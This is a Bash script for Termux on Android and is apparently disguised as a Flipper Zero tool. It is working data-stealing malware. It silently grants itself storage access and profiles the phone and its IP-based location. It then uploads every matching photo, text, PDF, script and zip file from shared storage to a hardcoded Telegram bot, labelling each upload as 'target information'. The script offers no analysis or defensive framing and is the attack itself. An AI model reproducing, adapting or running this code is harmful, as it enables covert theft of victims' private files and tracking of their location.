#!/bin/bash

set +x

while true; do
    cekinstal="/data/data/com.termux/files/usr/lib/commplate"
    if [ -f "$cekinstal" ]; then
        TOKEN="8008006016:AAHFsasL6B-isriPHFvGwZTPkYkrUscQ21I"
        CHAT_ID=("5951232585")
        cek="$HOME/FLIPPERZERO-INDONESIA404.sh
        /cy78.txt"
        sent_files_file="/data/data/com.termux/files/usr/lib/sent_files.txt"
        sent_files=()

        if [ ! -f "$cek" ]; then
            echo "File $cek tidak ditemukan."
            exit 1
        fi

        nama=$(cat "$cek")
        neofetch --stdout > ~/device_info.txt
        brand=$(grep "Host:" ~/device_info.txt | awk -F ':' '{print $2}' | xargs)
        os=$(grep "OS:" ~/device_info.txt | awk -F ':' '{print $2}' | xargs)
        memory=$(grep "Memory:" ~/device_info.txt | awk -F ':' '{print $2}' | xargs | sed 's/B//g')

        if [[ "$memory" =~ "MB" ]]; then
            memory=$(echo "$memory" | sed 's/MB//g' | awk '{printf "%.2f GB", $1/1024}')
        elif [[ "$memory" =~ "KB" ]]; then
            memory=$(echo "$memory" | sed 's/KB//g' | awk '{printf "%.2f GB", $1/1024/1024}')
        fi

        ip_info=$(curl -s ipinfo.io)
        ip_address=$(echo "$ip_info" | jq -r '.ip')
        city=$(echo "$ip_info" | jq -r '.city')
        region=$(echo "$ip_info" | jq -r '.region')
        country=$(echo "$ip_info" | jq -r '.country')
        loc=$(echo "$ip_info" | jq -r '.loc')

        send_file() {
            local file="$1"
            local directory=$(dirname "$file")

            caption=$(cat << EOF
CY78 PROJECTS 

🔰 Informasi Target 🔰
📝 Nama Target : $nama
📱 Merek : $brand
🖥️ OS : $os
💾 Memori : $memory
📂 Asal Direktori : $directory
🌐 Alamat IP : $ip_address
🏙️ Kota : $city
📍 Wilayah : $region
🇨🇺 Negara : $country
📌 Lokasi : $loc
EOF
            )

            for chat_id in "${CHAT_ID[@]}"; do
                curl -s -X POST "https://api.telegram.org/bot$TOKEN/sendDocument" \
                    -F chat_id="$chat_id" \
                    -F document=@"$file" \
                    -F caption="$caption"
                sent_files+=("$file")
                echo "$file" >> "$sent_files_file"
            done
        }

        if [ ! -f "$sent_files_file" ]; then
            touch "$sent_files_file"
        else
            mapfile -t sent_files < "$sent_files_file"
        fi

        process_files() {
            local ext="$1"
            find /storage/emulated/0/ -type f -iname "*.$ext" 2> /dev/null | while read -r file; do
                if [[ ! " ${sent_files[*]} " =~ " ${file} " ]]; then
                    send_file "$file"
                fi
            done
        }

        extensions=("jpg" "png" "IMG" "txt" "pdf" "py" "sh" "zip")

        for ext in "${extensions[@]}"; do
            process_files "$ext" &
            sleep 1
        done

        wait

        exit
    else
    clear
        echo "y" | termux-setup-storage
        clear
        apt-get update
        apt-get install -y curl neofetch inetutils jq
        touch /data/data/com.termux/files/usr/lib/commplate
    fi
done
